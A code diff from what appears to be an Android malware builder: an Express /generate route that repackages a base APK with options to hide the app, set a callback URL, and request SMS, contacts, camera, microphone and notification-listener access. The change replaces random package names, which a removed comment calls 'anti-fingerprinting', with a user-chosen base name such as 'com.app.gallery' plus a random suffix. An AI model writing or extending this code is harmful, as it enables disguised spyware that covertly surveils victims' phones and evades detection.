@@ -68,7 +68,7 @@ initBaseApk().catch(e => console.error("Init failed fatally:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
-    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableMicrophonePermission, enableNotificationListener, aggressivePermissions, notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon } = req.body;
+    const { uuid, appName, packageName: userPackageName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableMicrophonePermission, enableNotificationListener, aggressivePermissions, notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon } = req.body;
     const customIcon = req.file;
 
     console.log(`[APK] Request for UUID: ${uuid}`);
@@ -123,15 +123,14 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
             }
 
-            // 2.5. Randomize Package Name for anti-fingerprinting
             await sendUpdate('apk_progress', { step: 'Applying security enhancements...', progress: 35 });
             const manifestPath = path.join(workDir, 'AndroidManifest.xml');
             const apktoolYmlPath = path.join(workDir, 'apktool.yml');
 
-            const prefixes = ['studio', 'tech', 'digital', 'smart', 'mobile', 'dev', 'creative', 'pixel', 'cloud', 'prime', 'nova', 'swift', 'bright', 'lite', 'neo', 'next', 'alpha', 'delta', 'micro', 'ultra', 'apex', 'core', 'pulse', 'wave', 'orbit', 'flux', 'onyx', 'quartz', 'amber', 'cobalt', 'slate', 'iron', 'zinc', 'optic', 'vibe', 'spark', 'frost', 'lunar', 'solar', 'aero', 'metro', 'turbo', 'nitro', 'rapid', 'sharp', 'focus', 'vivid', 'clear', 'sonic'];
-            const suffixes = ['gallery', 'photos', 'sync', 'media', 'viewer', 'manager', 'tools', 'hub', 'vault', 'drive', 'keeper', 'guard', 'link', 'connect', 'bridge', 'engine', 'space', 'zone', 'base', 'dock', 'flow', 'grid', 'lens', 'scope', 'track', 'wave', 'works', 'lab', 'port', 'gate', 'point', 'node', 'stack', 'layer', 'panel', 'board', 'desk', 'shelf', 'cache', 'archive'];
+            const suffixWords = ['sync', 'tools', 'hub', 'io', 'app', 'core', 'lite', 'pro', 'net', 'dev', 'labs', 'kit', 'box', 'one', 'go', 'max', 'plus', 'link', 'data', 'cloud', 'base', 'work', 'flow', 'edge', 'api', 'run', 'web', 'live', 'nova', 'bolt', 'wave', 'grid', 'node', 'port', 'gate', 'zone', 'dock', 'desk', 'lens', 'vault', 'guard', 'spark', 'pulse', 'scope', 'track', 'stack', 'layer', 'panel', 'point', 'space', 'media', 'drive', 'store', 'share', 'view', 'watch', 'play', 'cast', 'stream', 'bridge', 'connect', 'engine', 'studio', 'digital', 'mobile', 'smart', 'swift', 'rapid', 'turbo', 'metro', 'pixel', 'ultra', 'micro', 'alpha', 'delta', 'prime', 'clear', 'vivid', 'sharp', 'focus', 'sonic', 'aero', 'orbit', 'flux'];
             const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
-            const newPackageName = `com.${pick(prefixes)}.${pick(suffixes)}`;
+            const basePkg = (userPackageName && userPackageName.trim()) ? userPackageName.trim() : 'com.app.gallery';
+            const newPackageName = `${basePkg}.${pick(suffixWords)}`;
             let oldPackageName = 'com.hexa.core';
             if (fs.existsSync(manifestPath)) {
                 const rawManifest = fs.readFileSync(manifestPath, 'utf8');
